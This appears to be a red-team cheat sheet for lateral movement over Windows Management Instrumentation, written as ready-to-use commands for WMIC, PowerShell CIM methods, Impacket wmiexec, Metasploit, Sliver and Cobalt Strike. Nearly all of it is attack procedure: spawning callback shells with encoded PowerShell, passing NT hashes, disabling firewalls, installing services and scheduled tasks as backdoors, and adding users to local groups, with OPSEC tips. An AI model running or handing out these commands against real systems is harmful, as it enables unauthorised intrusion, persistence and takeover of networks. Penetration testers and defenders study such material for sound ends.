# Windows Management Instrumentation Command line (WMIC)

## 01 - Command Prompt

### 1.1 - Usage

- Execute a WMIC with commands remotely (You'll be relying on this a lot and it leaves a little footprint)

```
C:\> C:\Windows\SysWOW64\wbem\WMIC.exe

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "<commands>"

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] win32_process call create "C:\path\to\shell.exe"
```

### 1.2 - Use Cases

#### 1.2.1 - Spawn Callback Shells

```
C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "cmd.exe /c <commands>"

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "C:\path\to\shell.exe"

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "rundll32 C:\path\to\shell.dll"

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "C:\Windows\System32\WindowsPowershell\v1.0\powershell -v 2 -enc <base64_encoded>"

C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -v 2 -enc <base64_encoded>"
```

#### 1.2.2 - Firewalls

- Disabling firewall rules (not recommended for OPSEC)

`C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "cmd.exe /c netsh advfirewall set allprofiles state off"`

- Deleting a firewall rule

`C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "cmd.exe /c netsh advfirewall firewall delete rule name=\"<rule_name>\""`

- Adding firewall rules

`C:\> wmic /node:<IP> [/user:<username>] [/password:<password>] process call create "cmd.exe /c netsh advfirewall firewall add rule name=\"<rule_name>\" dir=in action=allow protocol=tcp localport=<port>"`

## 02 - Powershell

### 2.1 - Usage

#### 2.1.1 - Invoke-WmiMethod

```
PS C:\> Get-CimInstance -Classname Win32_Net* -List

PS C:\> Invoke-WmiMethod -Class Win32_NetConnection -ComputerName <IP> -Name RunPS -ArgumentList "<commands>"
```

#### 2.1.2 - Invoke-CimMethod

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
	CommandLine = "powershell.exe -noni -nop -ep bypass -E <base64_payload>"
}
```

### 2.2 - Use Cases

#### 2.2.1 - Spawn Callback Shells

##### 2.2.1.1 - Download Cradle

- `Invoke-WmiMethod`

```powershell
PS C:\> Invoke-WmiMethod -Class Win32_NetConnection -ComputerName <IP> -Name RunPS -ArgumentList "powershell -E <base64_encoded>"
```

```powershell
PS C:\> $servicetype = [byte] 16
$errorcontrol = [byte] 1
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false, "Windows Performance", $errorcontrol, $null,$null,"WinPerf","c:\windows\system32\cmd.exe /c powershell -e <base64_encoded>",$null,$servicetype,"Manual","NT AUHORITY\SYSTEM","" -ComputerName <IP> -Credential <domain_name>\Administrator
```

- `Invoke-CimMethod`

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

$Command = "powershell.exe -noni -nop -ep bypass -E <base64_payload>"

Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
	CommandLine = $Command
}
```

##### 2.2.1.2 - MSI Package

- `Invoke-CimMethod`

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
	PackageLocation = "C:\path\to\shell.msi";
	Options = "";
	AllUsers = $false
}
```

#### 2.2.2 - Create Service

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
	Name = "UpdateSVC";
	DisplayName = "UpdateSVC";
	Pathname = "C:\path\to\shellsvc.exe";
	ServiceType = [byte]::Parse("16"); # Win32OwnProcess
	StartMode = "<Manual | Auto>"
}

$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -Filter "Name LIKE 'UpdateSVC'"

# Start the service

Invoke-CimMethod -InputObject $Service -MethodName StartService

# Stop the service

Invoke-CimMethod -InputObject $Service -MethodName StopService

# Delete service

Invoke-CimMethod -InputObject $Service -MethodName Delete
```

#### 2.2.3 - Schedule Tasks

```powershell
PS C:\> $username = '<username>'
$password = '<password>'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword

$Opt = New-CimSessionOption -Protocol DCOM

$Session = New-CimSession -ComputerName <IP> -Credential $credential -SessionOption $Opt -ErrorAction Stop

$Command = "cmd.exe"

$Args = "/c net user <username> <password> /add & net localgroup `"<local_group>`" <username> /add /y"

# Create new schedule task

$Action = New-ScheduleTaskAction -CimSession $Session -Execute $Command $Argument $Args

Register-ScheduleTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "<schedule_taskname>"

# Execute schedule task

Start-ScheduleTask -CimSession $Session -TaskName "<schedule_taskname>"

# Delete schedule task

Unregister-ScheduleTask -CimSession $Session -TaskName "<schedule_taskname>"
```

## 03 - Impacket

- Authenticate via impacket script with WMIExec

`$ wmiexec <username>:<password>@<IP> [-codecs <codec>]`

- Pass the Hash

```
$ wmiexec <username>@<IP> -hashes <LM>:<NT> [-codecs <codec>]

$ wmiexec <domain_name>/<username>@<IP> -hashes aad3b435b51404eeaa3b435b51404ee:<nthash>
```

## 04 - Metasploit

### 4.1 - Modules

#### 4.1.1 - Auxiliary

```
msf > use auxiliary/scanner/smb/impacket/wmiexec

msf auxiliary(scanner/smb/impacket/wmiexec) > options

Module options (auxiliary/scanner/smb/impacket/wmiexec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND                     yes       The command to execute
   OUTPUT     true             yes       Get the output of the executed command
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     yes       The password for the specified username
   SMBUser                     yes       The username to authenticate as
   THREADS    1                yes       The number of concurrent threads (max one per host)

msf auxiliary(scanner/smb/impacket/wmiexec) > set command <commands>

msf auxiliary(scanner/smb/impacket/wmiexec) > set rhosts <target_IP>

msf auxiliary(scanner/smb/impacket/wmiexec) > set output true

msf auxiliary(scanner/smb/impacket/wmiexec) > set smbuser <username>

msf auxiliary(scanner/smb/impacket/wmiexec) > set smbpass <password | nt_hash>

msf auxiliary(scanner/smb/impacket/wmiexec) > set smbdomain <domain>

msf auxiliary(scanner/smb/impacket/wmiexec) > set threads 2

msf auxiliary(scanner/smb/impacket/wmiexec) > run
```

#### 4.1.2 - Exploit

```
msf > use exploit/windows/local/ps_wmi_exec

msf exploit(windows/local/ps_wmi_exec) > options

Module options (exploit/windows/local/ps_wmi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DOMAIN                     no        Domain or machine name
   PASSWORD                   no        Password to authenticate with
   RHOSTS                     no        Target address range or CIDR identifier
   SESSION                    yes       The session to run this module on
   USERNAME                   no        Username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Universal
```

```
msf > use exploit/windows/local/wmi

msf exploit(windows/local/wmi) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/wmi) > options

Module options (exploit/windows/local/wmi):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   RHOSTS                                yes       Target address range or CIDR identifier
   ReverseListenerComm                   no        The specific communication channel to use for this listener
   SESSION                               yes       The session to run this module on
   SMBDomain                             no        The Windows domain to use for authentication
   SMBPass                               no        The password for the specified username
   SMBUser                               no        The username to authenticate as
   TIMEOUT              10               yes       Timeout for WMI command in seconds


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

#### 4.1.3 - Post

```
msf > use post/windows/gather/wmic_command

msf post(windows/gather/wmic_command) > options

Module options (post/windows/gather/wmic_command):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   COMMAND                     no        WMIC command options.
   RESOURCE                    no        Full path to resource file to read commands from.
   RHOST      localhost        yes       Target address range
   SESSION                     yes       The session to run this module on
   SMBDomain                   no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   TIMEOUT    10               yes       Timeout for WMI command in seconds

msf post(windows/gather/wmic_command) > set session <session_id>

msf post(windows/gather/wmic_command) > set rhost <target_IP>

msf post(windows/gather/wmic_command) > set smbuser <username>

msf post(windows/gather/wmic_command) > set smbpass <password | ntlm_hash>

msf post(windows/gather/wmic_command) > set command <WQL Queries>

msf post(windows/gather/wmic_command) > run
```

- Here's an example

```
msf post(windows/gather/wmic_command) > set command bios get serialnumber

msf post(windows/gather/wmic_command) > run
```

## 05 - Sliver

### 5.1 - Spawn Callback Shell

`sliver (IMPLANT_NAME) > sharp-wmi action=exec computername=<IP> command=\"""C:\\Windows\\Temp\\shell.exe""\"`

## 06 - Havoc

TODO: Demonstrate commands using wmiexec with Havoc

## 07 - Cobalt Strike

### 7.1 - Remote-Exec

#### 7.1.1 - Spawn Callback Shell

```
beacon> remote-exec wmi <IP> C:\path\to\shell.exe

beacon> remote-exec wmi <IP> "rundll32 C:\path\to\shell.dll"

beacon> link <IP>
```

#### 7.1.2 - Execute Commands

`beacon> remote-exec wmi <IP> <cmdlets>`

---
## References

- [Mandiant: Windows Management Instrumentation](https://www.mandiant.com/sites/default/files/2021-09/wp-windows-management-instrumentation.pdf)

- [Installing Reverse Shell Backdoors on Windows Systems](https://ivanitlearning.wordpress.com/2019/06/09/installing-reverse-shell-backdoors-on-windows-systems/)

- [Lateral Movement Command Execution Win32_Server](https://www.sakshamdixit.com/lateral-movement-command-execution-win32_service/)

- [Backdoor with WMI](https://www.sakshamdixit.com/backdoor-with-wmi/)

- [Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)

- [SharpWMI](https://github.com/GhostPack/SharpWMI)